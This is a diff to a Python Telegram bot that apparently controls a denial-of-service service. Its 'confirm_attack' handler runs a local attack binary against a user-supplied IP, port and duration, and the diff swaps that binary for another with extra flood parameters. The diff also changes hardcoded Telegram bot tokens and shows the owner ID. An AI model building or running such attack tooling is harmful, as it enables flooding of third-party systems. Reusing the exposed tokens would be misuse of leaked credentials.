@@ -8,7 +8,7 @@ from telebot import types
 import threading
 
 # Using your provided Telegram bot token and owner ID
-TELEGRAM_TOKEN = '7686606251:AAHYYNhgtWrXQ5gprlfOt76mttiA4VzQu70'
+TELEGRAM_TOKEN = '7686606251:AAGLngp85Rgw1p0yWq4g56XVqNDjvqtdxHI'
 OWNER_ID = '1604629264'
 
 bot = telebot.TeleBot(TELEGRAM_TOKEN)
@@ -52,8 +52,8 @@ def help_command(message):
         "📢 /broadcast <code>message</code> - Send a message to all approved users\n"
     )
     markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("🌍 Website", url="https://yourwebsite.com"))
-    markup.add(types.InlineKeyboardButton("📞 Contact Support", url="https://t.me/yourchannel"))
+    markup.add(types.InlineKeyboardButton("🌍 Channel", url="https://yourwebsite.com"))
+    markup.add(types.InlineKeyboardButton("📞 Support", url="https://t.me/yourchannel"))
     bot.reply_to(message, help_text, parse_mode="HTML", reply_markup=markup)
 
 @bot.message_handler(commands=['status'])
@@ -175,7 +175,7 @@ def confirm_attack(call):
             time.sleep(1)
         
         # Step 4: Execute the Binary Command
-        command = f"./LEGEND {ip} {port} {duration}"
+        command = f"./para {ip} {port} {duration} 9 500"
         try:
             result = subprocess.run(shlex.split(command), check=True, capture_output=True, text=True)
             output = html.escape(result.stdout)
